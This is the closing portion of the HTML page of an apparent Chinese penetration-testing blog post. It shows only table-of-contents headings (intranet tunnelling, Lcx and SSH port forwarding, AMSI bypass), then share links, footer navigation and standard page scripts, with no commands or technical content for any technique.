场景一：内网防火墙对出口流量没有任何端口限制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BB%85%E5%85%81%E8%AE%B8%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%E7%9A%84%E7%89%B9%E5%AE%9A%E7%AB%AF%E5%8F%A3%E5%A6%8280-443"><span class="toc-number">14.0.0.1.0.2.</span> <span class="toc-text"> 场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89tcp%E4%B8%8D%E5%87%BA%E7%BD%91-http%E4%BB%A3%E7%90%86"><span class="toc-number">14.0.0.1.0.3.</span> <span class="toc-text"> 场景三：TCP 不出网 - HTTP 代理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9Btcp%E5%87%BA%E7%BD%91-socks%E4%BB%A3%E7%90%86"><span class="toc-number">14.0.0.1.0.4.</span> <span class="toc-text"> 场景四	TCP 出网 - socks 代理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-lcx"><span class="toc-number">14.0.0.2.</span> <span class="toc-text"> 0x02 Lcx</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.2.1.</span> <span class="toc-text"> 端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">14.0.0.2.2.</span> <span class="toc-text"> 端口映射</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-ssh%E9%9A%A7%E9%81%93"><span class="toc-number">14.0.0.3.</span> <span class="toc-text"> 0x03  SSH 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.1.</span> <span class="toc-text"> SSH 本地转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.2.</span> <span class="toc-text"> SSH 远程转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%81%9A%E5%8A%A8%E6%80%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.3.</span> <span class="toc-text"> SSH 动态转发，正向代理做动态的端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E5%8D%95%E4%B8%80%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.4.</span> <span class="toc-text"> SSH 动态转发，正向代理进行单一的端口转发</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16bypass-amsi"><span class="toc-number">15.</span> <span class="toc-text"> 16.Bypass AMSI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%85%B3%E9%97%ADamsi"><span class="toc-number">15.0.1.</span> <span class="toc-text"> 一键关闭 AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E9%99%8D%E7%BA%A7"><span class="toc-number">15.0.2.</span> <span class="toc-text"> powershell 降级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81"><span class="toc-number">15.0.3.</span> <span class="toc-text"> 内存补丁</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&text=渗透"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&is_video=false&description=渗透"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=渗透&body=Check out this article: http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&name=渗透&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&t=渗透"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/blog/">首页</a></li><!--
     --><!--
       --><li><a href="/blog/about/">关于</a></li><!--
     --><!--
       --><li><a href="/blog/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/tymolu233">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/blog/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
